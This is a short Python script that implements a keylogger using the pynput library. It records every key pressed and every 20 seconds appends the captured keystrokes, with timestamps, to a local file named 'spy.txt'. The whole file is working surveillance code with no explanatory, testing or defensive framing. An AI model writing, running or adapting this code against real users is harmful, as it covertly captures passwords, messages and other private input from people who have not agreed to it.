from pynput.keyboard import Key, Listener
import logging
import time


class KeyLogger:
    def __init__(self):
        logging.basicConfig(
            filename='spy.txt',
            filemode='a',
            format='%(asctime)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            level=logging.DEBUG)

        self.start_time = time.time()
        self.list_of_symbols = []

    def on_press(self, key):
        curr_time = time.time()
        self.list_of_symbols.append(str(key))

        if curr_time - self.start_time >= 20:
            logging.info(' '.join(self.list_of_symbols))

            self.list_of_symbols.clear()
            self.start_time = curr_time

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()


def main():
    kl = KeyLogger()
    kl.start()


if __name__ == '__main__':
    main()
